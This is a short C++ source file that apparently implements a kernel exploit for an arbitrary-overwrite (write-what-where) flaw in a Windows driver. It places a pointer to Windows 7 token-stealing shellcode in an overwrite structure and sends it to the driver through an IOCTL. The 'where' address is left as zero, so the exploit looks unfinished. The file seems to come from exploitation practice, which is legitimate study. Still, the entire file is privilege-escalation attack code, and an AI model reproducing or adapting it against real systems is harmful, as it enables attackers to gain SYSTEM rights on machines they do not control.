#include "ArbitraryOverwrite.h"

bool 
ExploitArbitraryOverwrite::exploit() {
	
	struct arbitrary_overwrite_structure {
		LPVOID where;
		LPVOID what;
	};
	
	static const void* Shellcode_Ptr = reinterpret_cast<void*>(&token_stealing_win7);
	
	auto kernelModule = driver.GetKernelModuleInfos();
	const wstring kernelModuleName = get<2>(kernelModule);
	
	arbitrary_overwrite_structure structure = {
		/* where */ reinterpret_cast<LPVOID>(0),
		/* what  */ const_cast<LPVOID>(Shellcode_Ptr)
	};
	
	wcout << L"[+] Arbitrary Overwrite:\nt\t- Where: 0x" << hex << setw(8) << setfill(L'0')
			<< structure.where << L" (...)\n\t- What: 0x" 
			<< structure.what << L" (...)" << endl;
	
	bool ret = driver.SendIOCTL (
		ExploitArbitraryOverwrite::Ioctl_Code,
		&structure,
		sizeof(structure)
	);
	
	return ret;
}
